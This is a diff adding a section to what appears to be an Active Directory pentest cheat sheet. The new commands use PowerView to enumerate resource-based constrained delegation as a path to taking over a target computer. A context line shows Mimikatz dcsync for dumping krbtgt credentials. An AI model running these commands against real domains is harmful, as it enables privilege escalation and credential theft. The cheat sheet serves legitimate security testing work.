@@ -774,6 +774,19 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 ```
 
 ### Resource Based Constrained Delegation
+#### Check if there are computers with RBCD configured
+- If you own the object that has RBCD you can own the target object
+```
+Get-DomainComputer | Where-Object -Property msds-allowedtoactonbehalfofotheridentity | Select-Object samaccountname, msds-allowedtoactonbehalfofotheridentity
+```
+
+#### Check to where it is refering too
+```
+$RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
+(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
+Get-DomainObject <SID>
+```
+
 ### Computer object takeover
 - Requirements:
   - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
